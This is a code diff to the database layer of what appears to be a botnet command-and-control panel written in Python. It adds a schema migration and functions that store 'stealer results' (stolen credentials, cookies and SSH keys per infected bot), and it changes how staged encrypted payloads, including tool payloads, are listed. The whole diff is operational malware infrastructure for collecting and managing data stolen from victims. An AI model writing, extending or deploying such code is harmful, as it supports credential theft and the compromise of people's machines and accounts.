@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)
 
 DB_PATH = Path(__file__).parent.parent.parent / "panel.db"
 DATA_DIR = Path(__file__).parent.parent.parent / "data"
-CURRENT_SCHEMA_VERSION = 3
+CURRENT_SCHEMA_VERSION = 4
 
 _db_lock = asyncio.Lock()
 _db_conn: aiosqlite.Connection | None = None
@@ -191,6 +191,50 @@ MIGRATIONS = {
             )""",
             "CREATE INDEX IF NOT EXISTS idx_staging_requests_payload ON staging_requests(payload_id)",
             "CREATE INDEX IF NOT EXISTS idx_staging_requests_time ON staging_requests(requested_at DESC)",
+        ],
+    },
+    4: {
+        "description": "Make staging_payloads.stage_number nullable; add stealer_results table",
+        "up": [
+            # SQLite does not support ALTER COLUMN, so rebuild staging_payloads.
+            # stage_number was INTEGER NOT NULL (migration 3); tool payloads need NULL.
+            "PRAGMA foreign_keys=OFF",
+            """CREATE TABLE staging_payloads_new (
+                id TEXT PRIMARY KEY,
+                stage_number INTEGER,
+                name TEXT NOT NULL,
+                description TEXT,
+                encrypted_blob BLOB NOT NULL,
+                encryption_key_hint TEXT,
+                size INTEGER NOT NULL,
+                sha256 TEXT NOT NULL,
+                is_active INTEGER DEFAULT 1,
+                created_at INTEGER NOT NULL,
+                created_by TEXT,
+                FOREIGN KEY (created_by) REFERENCES operators(id)
+            )""",
+            "INSERT INTO staging_payloads_new SELECT * FROM staging_payloads",
+            "DROP TABLE staging_payloads",
+            "ALTER TABLE staging_payloads_new RENAME TO staging_payloads",
+            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_stage ON staging_payloads(stage_number)",
+            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_active ON staging_payloads(is_active)",
+            "PRAGMA foreign_keys=ON",
+            # Now add stealer_results
+            """CREATE TABLE IF NOT EXISTS stealer_results (
+                id TEXT PRIMARY KEY,
+                bot_hwid TEXT NOT NULL,
+                command_id TEXT,
+                credentials TEXT DEFAULT '[]',
+                cookies TEXT DEFAULT '[]',
+                ssh_keys TEXT DEFAULT '[]',
+                errors TEXT DEFAULT '[]',
+                collection_time_ms INTEGER,
+                received_at INTEGER NOT NULL,
+                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
+                FOREIGN KEY (command_id) REFERENCES commands(id)
+            )""",
+            "CREATE INDEX IF NOT EXISTS idx_stealer_results_bot ON stealer_results(bot_hwid)",
+            "CREATE INDEX IF NOT EXISTS idx_stealer_results_time ON stealer_results(received_at DESC)",
         ],
     },
 }
@@ -632,7 +676,7 @@ async def get_screenshot(screenshot_id: str) -> dict | None:
 
 async def save_staging_payload(
     payload_id: str,
-    stage_number: int,
+    stage_number: int | None,
     name: str,
     encrypted_blob: bytes,
     size: int,
@@ -724,3 +768,75 @@ async def list_staging_requests(payload_id: str = None, limit: int = 100) -> lis
         params = (limit,)
     async with db.execute(query, params) as cursor:
         return [dict(row) async for row in cursor]
+
+
+# =============================================================================
+# Stealer result functions
+# =============================================================================
+
+
+async def save_stealer_result(
+    result_id: str,
+    bot_hwid: str,
+    command_id: str | None,
+    credentials: list,
+    cookies: list,
+    ssh_keys: list,
+    errors: list,
+    collection_time_ms: int | None,
+) -> None:
+    db = await get_db()
+    async with _db_lock:
+        await db.execute(
+            "INSERT INTO stealer_results "
+            "(id, bot_hwid, command_id, credentials, cookies, ssh_keys, errors, collection_time_ms, received_at) "
+            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
+            (result_id, bot_hwid, command_id,
+             json.dumps(credentials), json.dumps(cookies),
+             json.dumps(ssh_keys), json.dumps(errors),
+             collection_time_ms, int(time.time())),
+        )
+        await db.commit()
+
+
+async def list_stealer_results_for_bot(bot_hwid: str) -> list[dict]:
+    db = await get_db()
+    async with db.execute(
+        "SELECT * FROM stealer_results WHERE bot_hwid = ? ORDER BY received_at DESC",
+        (bot_hwid,),
+    ) as cursor:
+        return [dict(row) async for row in cursor]
+
+
+async def list_all_stealer_results(limit: int = 100) -> list[dict]:
+    db = await get_db()
+    async with db.execute(
+        "SELECT * FROM stealer_results ORDER BY received_at DESC LIMIT ?", (limit,),
+    ) as cursor:
+        return [dict(row) async for row in cursor]
+
+
+async def list_active_staging_payloads(stage_number=...) -> list[dict]:
+    """
+    List active staging payloads.
+    Ellipsis (default) = all active payloads.
+    None = tool payloads (stage_number IS NULL).
+    int = payloads for that stage number.
+    """
+    db = await get_db()
+    if stage_number is ...:
+        async with db.execute(
+            "SELECT * FROM staging_payloads WHERE is_active = 1 ORDER BY created_at DESC"
+        ) as cursor:
+            return [dict(row) async for row in cursor]
+    elif stage_number is None:
+        async with db.execute(
+            "SELECT * FROM staging_payloads WHERE is_active = 1 AND stage_number IS NULL ORDER BY created_at DESC"
+        ) as cursor:
+            return [dict(row) async for row in cursor]
+    else:
+        async with db.execute(
+            "SELECT * FROM staging_payloads WHERE is_active = 1 AND stage_number = ? ORDER BY created_at DESC",
+            (stage_number,),
+        ) as cursor:
+            return [dict(row) async for row in cursor]
